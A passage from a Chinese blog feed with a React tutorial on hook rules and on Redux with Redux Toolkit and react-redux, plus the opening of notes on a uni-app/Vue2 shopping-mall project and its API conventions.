class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> { useState } <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">useToggle</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">const</span> [isShow, setIsShow] = <span class="title function_">useState</span>(<span class="literal">false</span>);</span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">toggle</span> = (<span class="params"></span>) =&gt; {</span><br><span class="line">    <span class="title function_">setIsShow</span>(!isShow);</span><br><span class="line">  };</span><br><span class="line">  <span class="keyword">return</span> [isShow, toggle];</span><br><span class="line">}</span><br><span class="line"><span class="comment">// 这将报错：React Hook “useToggle” 不能在顶层调用。React Hook 必须在 React 函数组件或自定义 React Hook 函数中调用。</span></span><br><span class="line"><span class="keyword">const</span> [isShow, toggle, sendMsg] = <span class="title function_">useToggle</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">"App"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">span</span>&gt;</span>This is a React App.<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">}</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></tbody></table></figure></li><li><p>嵌套在 if 语句中</p><figure class="highlight jsx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> { useState } <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">useToggle</span>(<span class="params"></span>) {...</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">if</span> (<span class="title class_">Math</span>.<span class="title function_">random</span>() &gt; <span class="number">0.5</span>) {</span><br><span class="line">    <span class="comment">// 这将报错</span></span><br><span class="line">    <span class="keyword">const</span> [isShow, toggle, sendMsg] = <span class="title function_">useToggle</span>();</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">"App"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">span</span>&gt;</span>This is a React App.<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">}</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li></ol><h2 id="redux-html-小试牛刀"><a class="markdownIt-Anchor" href="#redux-html-小试牛刀"></a> Redux-html 小试牛刀</h2><p>Redux 是 React 最常用的集中状态管理工具，类似于 Vue 中的 Pinia（或者 Vuex），可以独立于框架运行<br>作用：通过集中管理的方式管理应用的状态</p><p>使用步骤：</p><ol><li>定义一个 reducer 函数（根据当前想要做的修改返回一个新的状态）</li><li>使用 createStore 方法传入 reducer 函数生成一个 store 实例对象</li><li>使用 store 实例的 subscribe 方法订阅数据的变化（数据一旦变化，可以得到通知）</li><li>使用 store 实例的 dispatch 方法提交 action 对象触发数据变化（告诉 reducer 你想怎么改数据）</li><li>使用 store 实例的 getState 方法获取最新的状态数据更新到视图中</li></ol><p>例如在 Html 中使用 redux，代码如下：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Html Redux Example<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"increment"</span>&gt;</span>Increment<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"counter"</span>&gt;</span>99<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"decrement"</span>&gt;</span>Decrement<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdnjs.cloudflare.com/ajax/libs/redux/4.0.5/redux.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> counter = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"counter"</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// state管理数据的初始状态，action存放的是触发的动作</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">function</span> <span class="title function_">reducer</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="language-javascript">        state = { counter: <span class="built_in">Number</span>(counter.textContent) },</span></span></span><br><span class="line"><span class="params"><span class="language-javascript">        action</span></span></span><br><span class="line"><span class="params"><span class="language-javascript">      </span>) {</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (action.<span class="property">type</span> === <span class="string">"INCREMENT"</span>) {</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">return</span> { <span class="attr">counter</span>: state.<span class="property">counter</span> + <span class="number">1</span> }; <span class="comment">// 不能直接修改state，需要基于原始的state创建一个新的对象</span></span></span><br><span class="line"><span class="language-javascript">        } <span class="keyword">else</span> <span class="keyword">if</span> (action.<span class="property">type</span> === <span class="string">"DECREMENT"</span>) {</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">return</span> { <span class="attr">counter</span>: state.<span class="property">counter</span> - <span class="number">1</span> };</span></span><br><span class="line"><span class="language-javascript">        }</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> state; <span class="comment">// 其他情况返回原来的state</span></span></span><br><span class="line"><span class="language-javascript">      }</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> store = <span class="title class_">Redux</span>.<span class="title function_">createStore</span>(reducer); <span class="comment">// 创建一个Redux的store</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      store.<span class="title function_">subscribe</span>(<span class="function">() =&gt;</span> {</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 每次state发生变化时，都调用这个函数</span></span></span><br><span class="line"><span class="language-javascript">        counter.<span class="property">textContent</span> = store.<span class="title function_">getState</span>().<span class="property">counter</span>; <span class="comment">// 更新页面上的counter</span></span></span><br><span class="line"><span class="language-javascript">      });</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> inBtn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"increment"</span>);</span></span><br><span class="line"><span class="language-javascript">      inBtn.<span class="title function_">addEventListener</span>(<span class="string">"click"</span>, <span class="function">() =&gt;</span> {</span></span><br><span class="line"><span class="language-javascript">        store.<span class="title function_">dispatch</span>({ <span class="attr">type</span>: <span class="string">"INCREMENT"</span> }); <span class="comment">// 触发action</span></span></span><br><span class="line"><span class="language-javascript">      });</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> deBtn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"decrement"</span>);</span></span><br><span class="line"><span class="language-javascript">      deBtn.<span class="title function_">addEventListener</span>(<span class="string">"click"</span>, <span class="function">() =&gt;</span> {</span></span><br><span class="line"><span class="language-javascript">        store.<span class="title function_">dispatch</span>({ <span class="attr">type</span>: <span class="string">"DECREMENT"</span> });</span></span><br><span class="line"><span class="language-javascript">      });</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h2 id="redux-与-react"><a class="markdownIt-Anchor" href="#redux-与-react"></a> Redux 与 React</h2><p>在 React 中使用 redux，官方要求安装俩个其他插件：Redux Toolkit 和 react-redux</p><ul><li>Redux Toolkit（RTK）是官方推荐编写 Redux 逻辑的方式，是一套工具的集合集，<strong>简化书写方式</strong></li><li> react-redux 是用来链接 Redux 和 React 组件的中间件</li></ul><p>安装命令可以是：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建项目</span></span><br><span class="line">npx create-react-app yourProjectName</span><br><span class="line"><span class="comment"># 安装插件</span></span><br><span class="line">npm i @reduxjs/toolkit react-redux</span><br></pre></td></tr></tbody></table></figure><p>或者使用 vite 构建项目，命令可以是：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm create vite@latest my-vite-app</span><br></pre></td></tr></tbody></table></figure><p>运行上述命令之后，按照提示选择 create-react-app 模板即可（SWC 是 JavaScript <a href="https://so.csdn.net/so/search?q=%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7&amp;spm=1001.2101.3001.7020">编译工具</a>比 Babel 要快，但是在功能和插件生态系统方面 Babel 更完善）。</p><h3 id="redux-目录结构安排"><a class="markdownIt-Anchor" href="#redux-目录结构安排"></a> Redux 目录结构安排</h3><p>安装好 Redux 后，应该对 sotre 目录结构有一定的安排，可以是：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411141957404.png" alt="image-20241114195752266"></p><p>index.js 将 modules 中的 store 导出即可，比较类似 Pinia 的目录安排。</p><h3 id="创建一个-countersotre"><a class="markdownIt-Anchor" href="#创建一个-countersotre"></a> 创建一个 counterSotre</h3><p>编写代码如下：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> { createSlice } <span class="keyword">from</span> <span class="string">"@reduxjs/toolkit"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> counterStore = <span class="title function_">createSlice</span>({</span><br><span class="line">  <span class="attr">name</span>: <span class="string">"counter"</span>,</span><br><span class="line">  <span class="attr">initialState</span>: {</span><br><span class="line">    <span class="attr">count</span>: <span class="number">99</span>,</span><br><span class="line">  },</span><br><span class="line">  <span class="comment">// 创建reducer的同时也会自动生成action creators</span></span><br><span class="line">  <span class="attr">reducers</span>: {</span><br><span class="line">    <span class="comment">// 均是同步的，直接修改state</span></span><br><span class="line">    <span class="attr">increment</span>: <span class="function">(<span class="params">state</span>) =&gt;</span> {</span><br><span class="line">      state.<span class="property">count</span>++;</span><br><span class="line">    },</span><br><span class="line">    <span class="attr">decrement</span>: <span class="function">(<span class="params">state</span>) =&gt;</span> {</span><br><span class="line">      state.<span class="property">count</span>--;</span><br><span class="line">    },</span><br><span class="line">    <span class="comment">// action参数接受额外的参数</span></span><br><span class="line">    <span class="attr">incrementByAmount</span>: <span class="function">(<span class="params">state, action</span>) =&gt;</span> {</span><br><span class="line">      state.<span class="property">count</span> += <span class="title class_">Number</span>(action.<span class="property">payload</span>);</span><br><span class="line">    },</span><br><span class="line">    <span class="attr">decrementByAmount</span>: <span class="function">(<span class="params">state, action</span>) =&gt;</span> {</span><br><span class="line">      state.<span class="property">count</span> -= <span class="title class_">Number</span>(action.<span class="property">payload</span>);</span><br><span class="line">    },</span><br><span class="line">  },</span><br><span class="line">});</span><br><span class="line"><span class="comment">// 解构方便导出使用</span></span><br><span class="line"><span class="keyword">const</span> { increment, decrement, incrementByAmount, decrementByAmount } =</span><br><span class="line">  counterStore.<span class="property">actions</span>;</span><br><span class="line"><span class="keyword">const</span> reducer = counterStore.<span class="property">reducer</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> { increment, decrement, incrementByAmount, decrementByAmount };</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> reducer;</span><br></pre></td></tr></tbody></table></figure><div class="note info flat"><p><em>info</em></p><ul><li>为什么创建 Store 的方法为 createSlice？</li></ul><p>因为在 Redux 中，"切片"（slice）是指将 Redux 状态的逻辑按照功能进行分割和组织的方式。每个切片通常包含以下几个部分：</p><ol><li><strong>初始状态</strong>：定义该切片的初始状态，通常是一个对象。</li><li><strong>reducers</strong>：一组用于更新该切片状态的函数。每个 reducer 函数定义了如何根据不同的 action 修改状态。</li><li><strong>actions</strong>：由 reducers 生成的操作，这些操作可以在组件中被触发，以更新状态。</li></ol><p>切片的主要目的是提高代码的可维护性和可读性，将不同功能的状态和行为组织到一个地方，避免将所有的状态和逻辑集中在一个大型文件中。这样可以使状态管理更加清晰和模块化。</p></div><h3 id="导出-store"><a class="markdownIt-Anchor" href="#导出-store"></a> 导出 store</h3><p>在 store 目录下的 index.js 文件中编写代码如下：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> { configureStore } <span class="keyword">from</span> <span class="string">"@reduxjs/toolkit"</span>;</span><br><span class="line"><span class="keyword">import</span> counterReducer <span class="keyword">from</span> <span class="string">"./modules/counterStore"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store = <span class="title function_">configureStore</span>({</span><br><span class="line">  <span class="attr">reducer</span>: {</span><br><span class="line">    <span class="attr">counter</span>: counterReducer, <span class="comment">// 该名称实际上是可以随意的</span></span><br><span class="line">  },</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> store;</span><br></pre></td></tr></tbody></table></figure><p>由于子模块导出时，使用的是 <code>export default</code> 方式，所以可以重新命名为 counterReducer 以供 reducer 管理。此处的 reducer 和子模块的 reducer 类似一群孩子和监护人的关系，各个子模块的 reducer 由此处 index.js 的 reducer 管理。</p><h3 id="store-注入-react"><a class="markdownIt-Anchor" href="#store-注入-react"></a> Store 注入 React</h3><p>react-redux 负责把 Redux 和 React 链接起来，内置 Provider 组件通过 store 参数把创建好的 store 实例注入到应用，<br>链接正式建立。</p><p>在由 Vite 创建的项目中，找到 <code>src\main.jsx</code> 文件（如果是 npm 创建则是 index.js）：</p><figure class="highlight jsx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> { <span class="title class_">StrictMode</span> } <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> { createRoot } <span class="keyword">from</span> <span class="string">"react-dom/client"</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">"./index.css"</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">"./App.jsx"</span>;</span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">"./store"</span>; <span class="comment">// 导入store</span></span><br><span class="line"><span class="keyword">import</span> { <span class="title class_">Provider</span> } <span class="keyword">from</span> <span class="string">"react-redux"</span>; <span class="comment">// 导入Provider</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">createRoot</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"root"</span>)).<span class="title function_">render</span>(</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">StrictMode</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">Provider</span> <span class="attr">store</span>=<span class="string">{store}</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">App</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">Provider</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">StrictMode</span>&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></tbody></table></figure><p>使用 Provide 将 App 包裹，并指定好 store 属性，就可以在 React 中使用 redux 了。</p><h3 id="在组件中使用-store"><a class="markdownIt-Anchor" href="#在组件中使用-store"></a> 在组件中使用 store</h3><p>找到 App.jsx 修改为如下代码：</p><figure class="highlight jsx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> { useSelector } <span class="keyword">from</span> <span class="string">"react-redux"</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">const</span> { count } = <span class="title function_">useSelector</span>(<span class="function">(<span class="params">state</span>) =&gt;</span> state.<span class="property">counter</span>);</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">"App"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">{()</span> =&gt;</span> console.log("-clicked")}&gt;-<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">span</span>&gt;</span>{count}<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">{()</span> =&gt;</span> console.log("+clicked")}&gt;+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></tbody></table></figure><p>这个地方的 state 参数 <code>state =&gt; state.counter</code> 指的其实是 sotre 的 index.js 文件中的 reducer 中的 counter：</p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411142117502.png" alt="image-20241114211731362" style="zoom:50%;"><p>不过现在只能显示数据，而不能修改。</p><h3 id="修改数据"><a class="markdownIt-Anchor" href="#修改数据"></a> 修改数据</h3><div class="note info flat"><p>React 组件中修改 store 中的数据需要借助另外一个 hook 函数：<code>useDispatch</code></p><p>它的作用是生成提交 action 对象的 dispatch 函数。</p></div><p><code>App.jsx</code></p><figure class="highlight jsx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> { useSelector, useDispatch } <span class="keyword">from</span> <span class="string">"react-redux"</span>;</span><br><span class="line"><span class="keyword">import</span> {</span><br><span class="line">  decrement,</span><br><span class="line">  increment,</span><br><span class="line">  incrementByAmount,</span><br><span class="line">} <span class="keyword">from</span> <span class="string">"./store/modules/counterStore"</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">const</span> { count } = <span class="title function_">useSelector</span>(<span class="function">(<span class="params">state</span>) =&gt;</span> state.<span class="property">counter</span>);</span><br><span class="line">  <span class="keyword">const</span> dispatch = <span class="title function_">useDispatch</span>();</span><br><span class="line">  <span class="keyword">let</span> amount = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">handleAmountChange</span>(<span class="params">e</span>) {</span><br><span class="line">    amount = e.<span class="property">target</span>.<span class="property">value</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">"App"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">input</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">type</span>=<span class="string">"text"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">placeholder</span>=<span class="string">"Enter amount"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">onChange</span>=<span class="string">{handleAmountChange}</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">{()</span> =&gt;</span> dispatch(incrementByAmount(amount))}&gt;</span></span><br><span class="line"><span class="language-xml">        confirm</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">{()</span> =&gt;</span> dispatch(decrement())}&gt;-<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">span</span>&gt;</span>{count}<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">{()</span> =&gt;</span> dispatch(increment())}&gt;+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></tbody></table></figure><p>在这段代码中，使用 <code>dispatch</code> 方法并传入 <code>increment()</code> 时，它实际上是调用导入了的 <code>increment</code> 这个 action creator 函数，这个函数会返回一个 action 对象。例如：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">{</span><br><span class="line">  <span class="attr">type</span>: <span class="string">"counter/increment"</span>; <span class="comment">// 这是类型自动生成的字符串</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="异步状态操作"><a class="markdownIt-Anchor" href="#异步状态操作"></a> 异步状态操作</h3><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> React </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GO-SHOPPING 商城项目笔记</title>
      <link href="/posts/47412.html"/>
      <url>/posts/47412.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><meta name="referrer" content="no-referrer"><blockquote><p>本项目是基于 uni-app 技术栈开发的，能够运行在多端 (微信小程序、h5、ios/Android) 的移动端商城项目。</p></blockquote><ul><li>重点：接口需要 token 的地方，header 中， Access-Token:${token}</li><li> 重点：接口需要 platform 的地方，header 中，platform: h5 或 mp-weixin</li><li> 接口调用基础地址：<a href="http://smart-shop.itheima.net/index.php?s=/api">http://smart-shop.itheima.net/index.php?s=/api</a></li><li> 关于接口的说明：分为了 http 状态码和接口中 code 对应码</li></ul><table><thead><tr><th style="text-align:left">码值</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left"> http 状态码 500</td><td style="text-align:left"> 服务器端异常</td></tr><tr><td style="text-align:left"> http 状态码 404</td><td style="text-align:left"> 服务器端异常</td></tr><tr><td style="text-align:left"> http 状态码 401</td><td style="text-align:left"> 授权信息不正确</td></tr></tbody></table><blockquote><p>测试环境，登录短信验证码统一为：246810 （不再提供真实的短信验证服务）</p><p><a href="https://apifox.com/apidoc/shared-12ab6b18-adc2-444c-ad11-0e60f5693f66/doc-2221080">接口文档地址</a></p><p><a href="https://youzan.github.io/vant/v2/#/zh-CN/">Vant2 官网地址</a></p><p>本项目使用 <code>ESLint+Standard config</code> 的代码规范标准</p></blockquote><h2 id="项目结构"><a class="markdownIt-Anchor" href="#项目结构"></a> 项目结构</h2><meta name="description" content="记录学习过的Vue2商城项目，写法接近uniapp，稍加改造可以成为uniapp项目">## 一级路由配置<p>将每个基础的一级页面以文件夹形式存放于 views 包中。包括：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408281710771.png" alt="image-20240828171025686">具体项目结构如下：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408281709022.png" alt="image-20240828170920935" style="zoom:80%;"></p><p>路由页如下：<br><img 